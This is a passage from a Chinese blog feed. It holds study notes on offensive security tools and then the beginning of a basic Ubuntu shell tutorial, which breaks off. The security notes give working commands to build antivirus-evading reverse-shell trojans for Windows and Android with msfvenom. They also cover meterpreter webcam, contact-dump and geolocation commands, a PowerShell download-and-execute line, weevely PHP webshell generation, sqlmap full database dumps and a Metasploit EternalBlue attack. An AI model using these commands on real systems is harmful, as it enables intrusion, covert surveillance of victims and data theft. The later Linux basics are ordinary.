木马分类"></a>4.1 木马分类</h4><ul><li>正向木马：被控端感染木马后，主控端需要主动扫描才可以得知并连接。（不易暴露，但不知道木马什么时候被感染）</li><li>反向木马：在木马中留下 IP 地址，当被控端感染木马后会主动连接主控端。</li></ul><h4 id="4-2-netcat（瑞士军刀）"><a href="#4-2-netcat（瑞士军刀）" class="headerlink" title="4.2 netcat（瑞士军刀）"></a>4.2 netcat（瑞士军刀）</h4><blockquote><p><a href="https://www.sqlsec.com/2019/10/nc.html">nc命令教程</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -v ip port：探测端口是否开放（出现结果后可以直接中断）</span><br><span class="line">nc ip port：远程控制</span><br></pre></td></tr></table></figure><h4 id="4-3-MSFPC（生成远控软件）"><a href="#4-3-MSFPC（生成远控软件）" class="headerlink" title="4.3 MSFPC（生成远控软件）"></a>4.3 MSFPC（生成远控软件）</h4><p>MSFPC：msf payload creator</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 选择在哪个ip上生成指定platform的木马（ip 一般指定 eth0）（protocol：选择传输的协议，默认 tcp，改成 https 更安全）</span></span><br><span class="line">msfpc &lt;platform&gt; &lt;protocol&gt; &lt;ip&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行控制文件（rc：主控端文件，其他为被控端文件）</span></span><br><span class="line">msfconsole - q -r file.rc</span><br></pre></td></tr></table></figure><h4 id="4-4-msfvenom（生成远控软件，更全面）"><a href="#4-4-msfvenom（生成远控软件，更全面）" class="headerlink" title="4.4 msfvenom（生成远控软件，更全面）"></a>4.4 msfvenom（生成远控软件，更全面）</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-p / --payload &lt;payload&gt; <span class="comment"># 指定攻击载荷（msfvenom -l payloads：查询）</span></span><br><span class="line">-f / --format &lt;format&gt; <span class="comment"># 指定输出格式（msfvenom --list formats）（c：十六进制）</span></span><br><span class="line">-o / --out &lt;path&gt; <span class="comment"># 指定输出路径</span></span><br><span class="line">-e &lt;encode&gt; <span class="comment"># 指定加密码（一般的是固定加结果，x86/shikata_ga_nai：随机加密，防查杀可以选择多次/多重编码）</span></span><br><span class="line">-i &lt;num&gt; <span class="comment"># 指定编码次数</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 某个payload的详细用法</span></span><br><span class="line">msfvenom --list-options -p &lt;payloads&gt;</span><br><span class="line"><span class="comment"># 查询所有加密码</span></span><br><span class="line">msfvenom -l encoders</span><br><span class="line"></span><br><span class="line"><span class="comment"># 普通被控端</span></span><br><span class="line">sudo msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.157.156 lport=5000 -f exe -o /var/payload.exe</span><br><span class="line"><span class="comment"># 多重多次编码的被控端</span></span><br><span class="line">sudo msfvenom  -p windows/meterpreter/reverse_tcp lhost=192.168.157.156 lport=5000 -e x86/shikata_ga_nai -i 10 -f raw | msfvenom -e x86/alpha_super -i 5 -f exe -o /var/payload.exe</span><br><span class="line"><span class="comment"># 安卓被控端</span></span><br><span class="line">sudo msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.1.104 lport=9999 R&gt;/var/pentestAndroid9999.apk</span><br><span class="line"></span><br><span class="line"><span class="comment"># msfvenom主控端操作（meterpreter）</span></span><br><span class="line"><span class="comment"># 主控端启动</span></span><br><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload </span><br><span class="line"><span class="built_in">set</span> lhost </span><br><span class="line"><span class="built_in">set</span> lport </span><br><span class="line">exploit </span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得帮助</span></span><br><span class="line"><span class="built_in">help</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 摄像头命令</span></span><br><span class="line">Webcam Commands <span class="comment"># 摄像头命令</span></span><br><span class="line">web_cam_list <span class="comment"># 摄像头列表</span></span><br><span class="line">webcam_snap &lt;num&gt; <span class="comment"># 开启摄像头</span></span><br><span class="line">webcam_stream &lt;num&gt; <span class="comment"># 录视频</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 权限命令</span></span><br><span class="line">check_root <span class="comment"># 检测是否 root</span></span><br><span class="line">dump_contacts <span class="comment"># 导出记录</span></span><br><span class="line">geolocate <span class="comment"># 获取定位</span></span><br></pre></td></tr></table></figure><h4 id="4-5-杀毒软件（upx加壳）"><a href="#4-5-杀毒软件（upx加壳）" class="headerlink" title="4.5 杀毒软件（upx加壳）"></a>4.5 杀毒软件（upx加壳）</h4><blockquote><p> <a href="https://www.virscan.org/">病毒在线检测</a></p></blockquote><ul><li>杀毒软件原理：<ol><li>基于文件扫描的反病毒技术：检测二进制代码（检测硬盘），如果是病毒将加入特征库便于下次检测。</li><li>基于内存的反病毒技术：运行时发现，执行后的结构会与病毒特征匹配，匹配成功将不会被执行。</li><li>基于行为的反病毒技术：如果软件运行时执行的操作可疑（改注册表、控制进程等）将会被当成病毒查杀。</li></ol></li><li>反杀毒方式：<ol><li>改特征码。</li><li>添加花指令：添加无意义的指令改变特征码的位置。</li><li>程序加密：加壳，变成 PE 文件中的一串数据。（整个过程在加密过程中进行）</li></ol></li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 为软件加壳</span></span><br><span class="line">sudo upx &lt;path&gt;</span><br></pre></td></tr></table></figure><h4 id="4-6-powerspolit"><a href="#4-6-powerspolit" class="headerlink" title="4.6 powerspolit"></a>4.6 powerspolit</h4><blockquote><p>原理：被控端被控之后访问主控端的网站，利用被控端的 powershell 对被控端执行操作。<br>该程序主要用于搭建一个网站让被控端访问后控制被控端的 powershell，逃过杀毒软件的基于行为检测。</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 搭建网站</span></span><br><span class="line">powerspolit —— python3 -m http.server &lt;port&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载脚本</span></span><br><span class="line">iex(New-Object Net.webclient).DownloadString(<span class="string">&quot;url&quot;</span>)</span><br><span class="line"><span class="comment"># 脚本帮助</span></span><br><span class="line">get-help &lt;name&gt;</span><br><span class="line"><span class="comment"># 常用脚本</span></span><br><span class="line"><span class="comment"># 分包</span></span><br><span class="line">AntivirusBypass——Find_AVSignature.ps1</span><br><span class="line"><span class="comment"># 将 dll 文件注入到进程中</span></span><br><span class="line">CodeExectuion——Invoke-Dlllnjection.ps1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用</span></span><br><span class="line"><span class="comment"># 重新分包，分特征码，防止被发现</span></span><br><span class="line">find-avsignature -StartByte &lt;num&gt; -EndByte &lt;num&gt; -Interval &lt;num&gt; -path &lt;path&gt; -outpath &lt;path&gt;</span><br><span class="line">Invoke-Dlllnjection.ps1 -ProcessID &lt;ID&gt; -DLL &lt;path&gt;</span><br></pre></td></tr></table></figure><h4 id="4-7-weevely（PHP恶意代码生成）"><a href="#4-7-weevely（PHP恶意代码生成）" class="headerlink" title="4.7 weevely（PHP恶意代码生成）"></a>4.7 weevely（PHP恶意代码生成）</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 本地生成木马（带有密码，让他人无法访问）</span></span><br><span class="line">weevely generate &lt;password&gt; &lt;path&gt;</span><br><span class="line"><span class="comment"># 远程控制</span></span><br><span class="line">weeveky &lt;url&gt; &lt;password&gt;</span><br><span class="line"><span class="comment"># 帮助</span></span><br><span class="line"><span class="built_in">help</span></span><br></pre></td></tr></table></figure><h3 id="6-渗透测试"><a href="#6-渗透测试" class="headerlink" title="6 渗透测试"></a>6 渗透测试</h3><h4 id="5-1-sqlmap"><a href="#5-1-sqlmap" class="headerlink" title="5.1 sqlmap"></a>5.1 sqlmap</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 参数</span></span><br><span class="line">-u/--url &lt;url&gt; <span class="comment"># 指定注入目标 url</span></span><br><span class="line">--dbms &lt;sql&gt; <span class="comment"># 指定数据库（ --dbms=mysql ）</span></span><br><span class="line">--os &lt;os&gt; <span class="comment"># 指定操作系统（ --os=Windows ）</span></span><br><span class="line">--flush-session <span class="comment"># 刷新缓存</span></span><br><span class="line">--proxy <span class="comment"># 指定代理（ --proxy http://ip:port ）</span></span><br><span class="line">--user-agent <span class="comment"># 指定 user-agent 信息（ --user-agent=&#x27;...&#x27; ）</span></span><br><span class="line">-data <span class="comment"># 数据以 POST 方式提交（ --data=&quot;id=1&quot;）</span></span><br><span class="line">--level n <span class="comment">#等级（1-5）</span></span><br><span class="line">--form <span class="comment"># 自行寻找参数构造表单</span></span><br><span class="line">--batch <span class="comment"># 自动选择默认选项</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤</span></span><br><span class="line"><span class="comment"># 所有数据库</span></span><br><span class="line">python sqlmap -u  &lt;url&gt; --dbs --form --batch</span><br><span class="line"><span class="comment"># 爆破当前数据库名</span></span><br><span class="line">python sqlmap -u &lt;url&gt; --current-db --form --batch</span><br><span class="line"><span class="comment"># 表</span></span><br><span class="line">python sqlmap -u &lt;url&gt; -D <span class="string">&#x27;DBname&#x27;</span> --tables --form --batch</span><br><span class="line"><span class="comment"># 列</span></span><br><span class="line">python sqlmap -u &lt;url&gt; -D <span class="string">&#x27;DBname&#x27;</span> -T <span class="string">&#x27;table&#x27;</span> --columns --form --batch</span><br><span class="line"><span class="comment"># 数据</span></span><br><span class="line">python sqlmap -u &lt;url&gt; -D <span class="string">&#x27;DBname&#x27;</span> -T <span class="string">&#x27;table&#x27;</span> -C <span class="string">&#x27;column_1 , column_2&#x27;</span> --dump --form --batch</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一次性爆破所有数据</span></span><br><span class="line">python sqlmap -u &lt;目标URL&gt; --batch --crawl=1 --level=5 --risk=3 --dump-all</span><br><span class="line">--batch <span class="comment"># 不要求用户输入，直接默认</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新</span></span><br><span class="line">sudo sqlmap -update</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 报错：python: can&#x27;t open file &#x27;sqlmap&#x27;: [Errno 2] No such file or directory</span></span><br><span class="line">1.<span class="built_in">cd</span> /usr/bin</span><br><span class="line">2.python sqlmap -u http://www.xxx.com</span><br></pre></td></tr></table></figure><h4 id="5-2-metasploit"><a href="#5-2-metasploit" class="headerlink" title="5.2 metasploit"></a>5.2 metasploit</h4><blockquote><p>如下。</p></blockquote><h3 id="7-metasploit"><a href="#7-metasploit" class="headerlink" title="7 metasploit"></a>7 metasploit</h3><blockquote><p><a href="https://www.metasploit.com/">official::官网</a></p></blockquote><h4 id="6-1-msf-基础"><a href="#6-1-msf-基础" class="headerlink" title="6.1 msf 基础"></a>6.1 msf 基础</h4><blockquote><p>路径：/usr/share/metasploit-framework</p><p>Metasploit 程序需要使用 <a href="https://www.postgresql.org/">official::Postgresql</a> 数据库</p><ul><li>Postgresql：用于严格的企业场景。</li><li>MySQL：用于业务简单的互联网场景。</li></ul></blockquote><ul><li><p>基础库</p><ul><li><p>metasploit基础库</p><blockquote><p>文件位于源码根目录路径下的 libraries 目录中，包括 Rex,framework-core 和 framework-base 三部分。</p></blockquote></li><li><p>Rex </p><blockquote><p>是整个框架所依赖的最基础的一些组件，如包装的网络套接字、网络应用协议客户端与服务端实现、日志子系统、渗透攻击支持例程、PostgresQL以及 MySQL数据库支持等。</p></blockquote></li><li><p>framework-core库</p><blockquote><p>负责实现所有与各种类型的上层模块及插件的交互接口。</p></blockquote></li><li><p>framework-base库</p><blockquote><p>扩展了framework-core，提供更加简单的包装例程，并为处理框架各个方面的功能提供了一些功能类，用于支持用户接口与功能程序调用框架本身功能及框架集成模块。</p></blockquote></li></ul></li><li><p>模块</p><ul><li>Aux（分为辅助模块）：漏洞探测与扫描。</li><li>Exploits（渗透攻击模块）：渗透攻击。</li><li>Post（后渗透攻击模块）：shell 之后的进一步攻击。</li><li>payloads（攻击载荷模块）：用于攻击，程序注入，设置 shell。</li><li>Encoders（编码器模块）：编码。</li><li>Nops（空指令模块）：空指令。</li></ul></li><li><p>插件</p><blockquote><p>作用：插件能够扩充框架的功能，或者组装已有功能构成高级特性的组件。插件可以集成现有的一些外部安全工具，如 Nessus、OpenVAS 漏洞扫描器等，为用户接口提供一些新的功能。</p></blockquote></li><li><p>接口</p><ul><li>msfconsole：控制终端。</li><li>msfcli：命令行。</li><li>msfgui：图形化界面。</li><li>armitage：图形化界面。</li><li>msfapi：远程调用接口。</li></ul></li><li><p>功能程序</p><blockquote><p>metasploit还提供了一系列可直接运行的功能程序，支持渗透测试者与安全人员快速地利用metasploit框架内部能力完成一些特定任务。</p><p>比如 msfpayload、msfencode 和 msfvenom 可以将攻击载荷封装为可执行文件、C语言、JavaScript语言等多种形式，并可以进行各种类型的编码。</p></blockquote></li><li><p>Rank可靠性</p></li></ul><div class="table-container"><table><thead><tr><th>级别</th><th>效果</th></tr></thead><tbody><tr><td>excellent</td><td>漏洞利用程序绝对不会使目标服务崩溃，就像SQL注入、命令执行、远程文件包含、本地文件包含等等。除非有特殊情况，典型的内存破坏利用程序不可以被评估为该级别</td></tr><tr><td>great</td><td>该漏洞利用程序有一个默认的目标系统，并且可以自动检测适当的目标系统，或者在目标服务的版本检查之后可以返回到一个特定的返回地址</td></tr><tr><td>good</td><td>该漏洞利用程序有一个默认目标系统，并且是这种类型软件的”常见情况“（桌面应用程序的Windows 7，服务器的2012等）</td></tr><tr><td>normal</td><td>该漏洞利用程序是可靠的，但是依赖于特定的版本，并且不能或者不能可靠地自动检测</td></tr><tr><td>average</td><td>该漏洞利用程序不可靠或者难以利用</td></tr><tr><td>low</td><td>对于通用的平台而言，该漏洞利用程序几乎不能利用（或者低于50%的利用成功率）</td></tr><tr><td>manual</td><td>该漏洞利用程序不稳定或者难以利用并且基于拒绝服务（DOS）。如果一个模块只有在用户特别配置该模块的时候才会被用到，否则该模块不会被使用到，那么也可以评为该等级</td></tr></tbody></table></div><h4 id="6-2-模块使用流程"><a href="#6-2-模块使用流程" class="headerlink" title="6.2 模块使用流程"></a>6.2 模块使用流程</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 帮助</span></span><br><span class="line"><span class="built_in">help</span></span><br><span class="line"><span class="comment"># 展示信息（exploits：攻击模块）</span></span><br><span class="line">show &lt;name&gt;</span><br><span class="line"><span class="comment"># 查找模块（ms17_010：永恒之蓝）</span></span><br><span class="line">search &lt;name&gt;</span><br><span class="line"><span class="comment"># 展示参数</span></span><br><span class="line">show options</span><br><span class="line"><span class="comment"># show完exploits后可以直接输入数字使用模块</span></span><br><span class="line">use &lt;num&gt;</span><br><span class="line"><span class="comment"># 查看相关信息</span></span><br><span class="line">info</span><br><span class="line"><span class="comment"># 控制对象显示（-i &lt;num&gt;：切换到控制对象）</span></span><br><span class="line">sessions</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看evasion</span></span><br><span class="line">show evasion</span><br><span class="line"><span class="comment"># 使用evasion</span></span><br><span class="line">use &lt;evasion&gt;</span><br><span class="line"><span class="comment"># 查看参数</span></span><br><span class="line">show options</span><br><span class="line"><span class="comment"># 设置payload</span></span><br><span class="line"><span class="built_in">set</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment"># 流程</span></span><br><span class="line"><span class="comment"># 设置模块</span></span><br><span class="line">&lt;exploits&gt;</span><br><span class="line"><span class="comment"># 查看参数</span></span><br><span class="line">show options</span><br><span class="line"><span class="comment"># 设置参数</span></span><br><span class="line"><span class="built_in">set</span> &lt;options&gt; &lt;value&gt;</span><br><span class="line"><span class="comment"># 设置 payload</span></span><br><span class="line"><span class="built_in">set</span> payload &lt;payload&gt;</span><br><span class="line"><span class="comment"># 执行模块</span></span><br><span class="line">exploit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 回到上级，退出</span></span><br><span class="line">back / <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><ul><li><p>操作系统攻击</p><ul><li>ms17_010：win7，SMB协议</li></ul></li><li><p>应用程序攻击</p><ul><li>easyfilesharing——seh：http</li></ul></li><li><p>客户机攻击</p><blockquote><p>原理：被动攻击，需要用户进行配合。（例：点击恶意链接，下载恶意插件（Flash插件经常爆出恶意漏洞））</p></blockquote><ul><li>adobe_flash——adobe_flash_hacking_team_uaf( version &lt;= 18 )：flash（自建一个恶意网页，用户访问则会被攻击）</li></ul></li></ul><h4 id="6-3-其他命令"><a href="#6-3-其他命令" class="headerlink" title="6.3 其他命令"></a>6.3 其他命令</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 连接命令,一般用于内网渗透（[*]表示连接成功，可以使用命令如get来收集信息）</span></span><br><span class="line">connect &lt;ip&gt; &lt;port&gt; </span><br></pre></td></tr></table></figure><h4 id="6-4-查找命令"><a href="#6-4-查找命令" class="headerlink" title="6.4 查找命令"></a>6.4 查找命令</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 直接查找，或精确查找</span></span><br><span class="line">search &lt;name&gt;</span><br><span class="line">search name:&lt;name&gt;</span><br><span class="line">search port:&lt;port&gt;</span><br><span class="line">search path:&lt;path&gt;</span><br><span class="line">search platform:&lt;name&gt;</span><br><span class="line">search <span class="built_in">type</span>:&lt;cmd&gt; <span class="comment"># cmd:exploit,payload,auxiliary,encoder,evasion,post,nop</span></span><br><span class="line">search cve:CVE-2017-8464</span><br><span class="line"></span><br><span class="line"><span class="comment"># 联合查找</span></span><br><span class="line">search <span class="built_in">type</span>:&lt;name&gt; name:&lt;name&gt; ...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看模块详细信息</span></span><br><span class="line">info &lt;name&gt;</span><br></pre></td></tr></table></figure><h4 id="6-5-注意事项"><a href="#6-5-注意事项" class="headerlink" title="6.5 注意事项"></a>6.5 注意事项</h4><ul><li>msf 中的点是无法复制的（不可见的），要复制应到控制台中复制。</li></ul><h4 id="6-6-简单案例"><a href="#6-6-简单案例" class="headerlink" title="6.6 简单案例"></a>6.6 简单案例</h4><blockquote><p>使用流程：</p><ol><li>查找CVE公布的漏洞</li><li>查找对应的exploit模块</li><li>添加模块参数</li><li>添加payload后门</li><li>执行exploit攻击</li><li>执行后续操作</li></ol></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">永恒之蓝</span></span><br><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line">set rhosts [IP]</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set rhosts [IP]</span><br><span class="line">set payload windows/x64/shell_reverse_tcp</span><br><span class="line">exploit -j #-j 是在后台运行，不加成功后直接在前台执行</span><br><span class="line">sessions</span><br><span class="line">sessions -i [ID] # 切换到指定ID的会话</span><br><span class="line">background # 进入会话后输入。会话不断开继续保存在后台</span><br><span class="line">sessions -k [ID] # 断开某个会话</span><br></pre></td></tr></table></figure><h3 id="8-内网穿透"><a href="#8-内网穿透" class="headerlink" title="8 内网穿透"></a>8 内网穿透</h3><ul><li><p>外网访问内网</p><blockquote><p><a href="https://www.cnblogs.com/devymex/p/4156378.html">给防火墙开个洞</a></p></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> 操作系统安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 计算机系统 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu Linux</title>
      <link href="/posts/57602ae6.html"/>
      <url>/posts/57602ae6.html</url>
      
        <content type="html"><![CDATA[<h1 id="Ubuntu-Linux"><a href="#Ubuntu-Linux" class="headerlink" title="Ubuntu Linux"></a>Ubuntu Linux</h1><blockquote><p><a href="https://m.runoob.com/linux/linux-command-manual.html">Linux命令大全</a></p><p><a href="https://blog.csdn.net/qq_54075859/article/details/126374197">Ubuntu设置中文输入</a></p><p><a href="https://www.runoob.com/w3cnote/linux-useful-command.html">常用命令</a></p></blockquote><hr><h2 id="一、Linux-Shell"><a href="#一、Linux-Shell" class="headerlink" title="一、Linux Shell"></a>一、Linux Shell</h2><h3 id="1-简介"><a href="#1-简介" class="headerlink" title="1 简介"></a>1 简介</h3><blockquote><p>Shell接收用户指令，并协助用户完成与系统内核的交互，进而完成指令的执行。Bash就是一种代表性的Shell命令解释程序。</p></blockquote><h3 id="2-命令行"><a href="#2-命令行" class="headerlink" title="2 命令行"></a>2 命令行</h3><blockquote><p>打开命令行界面：</p><ol><li>组合键：Ctrl + Alt + T</li><li>界面点击终端。</li><li>路径：<code>/user/bin/gnome-terminal</code></li></ol><p>命令行提示：</p><p><code>[当前用户名@主机名 当前目录] 提示符</code></p><ul><li>~：当前登入用户的主目录</li><li>$：普通用户的终端</li><li>#：root用户的终端</li></ul></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 改变Shell的工作目录</span></span><br><span class="line"><span class="built_in">cd</span> ./</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用户名 : zp  主机名 : lab  当前工作目录为 : ~（/home/zp） 普通用户终端 : $ </span></span><br><span class="line">zp@lab：~$    </span><br></pre></td></tr></table></figure><h3 id="3-查看Shell"><a href="#3-查看Shell" class="headerlink" title="3 查看Shell"></a>3 查看Shell</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看当前使用的Shell程序</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$SHELL</span></span><br><span class="line"><span class="comment"># 查看当前系统中有效的Shell程序</span></span><br><span class="line"><span class="built_in">cat</span> /etc/shells</span><br><span class="line"><span class="comment"># 退出Shell程序</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"><span class="comment"># 更改Shell信息</span></span><br><span class="line">chsh</span><br></pre></td></tr></table></figure><h3 id="4-命令"><a href="#4-命令" class="headerlink" title="4 命令"></a>4 命令</h3><h4 id="4-1-含义"><a href="#4-1-含义" class="headerlink" title="4.1 含义"></a>4.1 含义</h4><blockquote><p><code>命令 [选项] [参数]</code></p><p>短命令选项前通常用 ‘ - ‘，长命令选项前通常用 ‘ — ‘。</p></blockquote><h4 id="4-2-root权限"><a href="#4-2-root权限" class="headerlink" title="4.2 root权限"></a>4.2 root权限</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 临时切换到root账户，执行su后输入密码</span></span><br><span class="line">su    </span><br><span class="line"><span class="comment"># 临时获取root权限来执行一条需要root权限的命令</span></span><br><span class="line">sudo cmd_name [ 其他参数选项 ]</span><br></pre></td></tr></table></figure><h4 id="4-3-电源操作"><a href="#4-3-电源操作" class="headerlink" title="4.3 电源操作"></a>4.3 电源操作</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 重启</span></span><br><span class="line">reboot</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关机</span></span><br><span class="line">shutdown</span><br><span class="line">shutdown -h now</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关机并切断电源</span></span><br><span class="line">poweroff  </span><br></pre></td></tr></table></figure><h4 id="4-4-查看信息"><a href="#4-4-查看信息" class="headerlink" title="4.4 查看信息"></a>4.4 查看信息</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输出当前工作目录的名称</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出目录中的内容</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">ll / <span class="built_in">ls</span> -l</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出系统信息</span></span><br><span class="line"><span class="built_in">uname</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示或者设置系统的主机名</span></span><br><span class="line">hostname</span><br></pre></td></tr></table></figure><h4 id="4-5-历史命令"><a href="#4-5-历史命令" class="headerlink" title="4.5 历史命令"></a>4.5 历史命令</h4><blockquote><p>查看历史命令。</p><p>命令只要与上一条不相同，无论是否运行成功，都会加入到历史记录中。</p><p>箭头（上，下）查询上一条和下一条命令。</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">history</span> [选项]</span><br><span class="line"></span><br><span class="line">num <span class="comment"># 查询近n条历史记录。</span></span><br><span class="line">-c <span class="comment"># 清空所有历史记录。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重复执行上一条指令</span></span><br><span class="line">!!</span><br><span class="line"><span class="comment"># 运行历史清单中的第num中命令（负号表示倒数）</span></span><br><span class="line">! num</span><br><span class="line"><span class="comment"># 运行上一条以letter字母开头的历史命令。</span></span><br><span class="line">! letter</span><br><span class="line"><span class="comment"># 编辑并运行上一条或第num条命令（负号表示倒数）</span></span><br><span class="line"><span class="built_in">fc</span> [ num ]  </span><br><span class="line"><span class="comment"># 运行前一条命令最后的参数</span></span><br><span class="line">!$ </span><br></pre></td></tr></table></figure><h3 id="5-功能"><a href="#5-功能" class="headerlink" title="5 功能"></a>5 功能</h3><blockquote><p>tab：自动补全。</p><p>Ctrl + C：强制中断。</p></blockquote><h3 id="6-高阶技巧"><a href="#6-高阶技巧" class="headerlink" title="6 高阶技巧"></a>6 高阶技巧</h3><h4 id="6-1-管道"><a href="#6-1-管道" class="headerlink" title="6.1 管道"></a>6.1 管道</h4><blockquote><p>在两个命令之间设置管道时，管道符左边命令的输出就变成了右边命令的输入。</p><p><code>命令1 | 命令2 ...| 命令n</code></p></blockquote><h4 id="6-2-重定向"><a href="#6-2-重定向" class="headerlink" title="6.2 重定向"></a>6.2 重定向</h4><blockquote><p>输入/输出重定向：改变输入与输出的方向。</p><p>Linux中标准输入设备是键盘，标准输出设备是显示器。</p><p>ID：文件描述符。</p></blockquote><div class="table-container"><table><thead><tr><th>ID</th><th>文件名</th><th>类型</th><th>硬件</th></tr></thead><tbody><tr><td>0</td><td>stdin</td><td>标准输入文件</td><td>键盘</td></tr><tr><td>1</td><td>stdout</td><td>标准输出文件</td><td>显示器</td></tr><tr><td>2</td><td>stderr</td><td>标准错误输出文件</td><td>显示器</td></tr></tbody></table></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输出重定向</span></span><br><span class="line"><span class="comment"># 将某一命令执行的输出保存到文件中，源文件存在则会覆盖源文件内容</span></span><br><span class="line">[<span class="built_in">command</span>] &gt; [file]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将某一命令执行的输出保存到文件中，会添加到已经存在的文件中</span></span><br><span class="line">[<span class="built_in">command</span>] &gt;&gt; [file]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入重定向</span></span><br><span class="line"><span class="comment"># 该输入重定向命令将文件的内容作为命令的输入</span></span><br><span class="line">[<span class="built_in">command</span>] &lt; [file]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 当前标准输入来自命令行的一对分隔符之间的内容</span></span><br><span class="line">[<span class="built_in">command</span>] &lt;&lt; [Separator]</span><br><span class="line">&gt; [content]</span><br><span class="line">&gt; [Separator]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 错误重定向</span></span><br><span class="line"><span class="comment"># 将某一命令执行的出错信息输出到文件中，源文件存在则会覆盖源文件内容</span></span><br><span class="line">[<span class="built_in">command</span>] 2&gt; [file]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将某一命令执行的出错信息输出保存到文件中，会添加到已经存在的文件中</span></span><br><span class="line">[<span class="built_in">command</span>] 2&gt;&gt; [file]</span><br></pre></td></tr></table></figure><h4 id="6-3-命令排列"><a href="#6-3-命令排列" class="headerlink" title="6.3 命令排列"></a>6.3 命令排列</h4><div class="table-container"><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>;</td><td>所有命令都被执行</td></tr><tr><td>&amp;&amp;</td><td>前命令为真才执行后命令</td></tr><tr><td>\</td><td>\</td><td></td><td>前命令为假才执行后命令</td></tr><tr><td>\</td><td></td><td>前命令作为后命令的参数</td></tr><tr><td>&amp;</td><td>多条命令在后台执行</td></tr></tbody></table></div><h4 id="6-4-命令续航"><a href="#6-4-命令续航" class="headerlink" title="6.4 命令续航"></a>6.4 命令续航</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1.转义符（输出为$zp）</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;\$zp&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.命令续行</span></span><br><span class="line">\ + enter</span><br></pre></td></tr></table></figure><h4 id="6-5-命令替换"><a href="#6-5-命令替换" class="headerlink" title="6.5 命令替换"></a>6.5 命令替换</h4><blockquote><p>将一个命令的结果作为命令的参数。</p><p>命令执行后的结果作为字符串保存在res中。</p><p><code>` </code>为反引号，在键盘esc的正下方。</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用</span></span><br><span class="line">res=$(命令)</span><br><span class="line">res=`命令`</span><br></pre></td></tr></table></figure><h4 id="6-6-命令别名"><a href="#6-6-命令别名" class="headerlink" title="6.6 命令别名"></a>6.6 命令别名</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义</span></span><br><span class="line"><span class="built_in">alias</span> [别名] = [需要定义别名的命令] <span class="comment">#（用 &quot;&quot; 括起）</span></span><br><span class="line"><span class="comment"># 查看</span></span><br><span class="line"><span class="built_in">alias</span></span><br><span class="line"><span class="comment"># 删除</span></span><br><span class="line"><span class="built_in">unalias</span> [别名]</span><br></pre></td></tr></table></figure><h4 id="6-7-命令帮助系统"><a href="#6-7-命令帮助系统" class="headerlink" title="6.7 命令帮助系统"></a>6.7 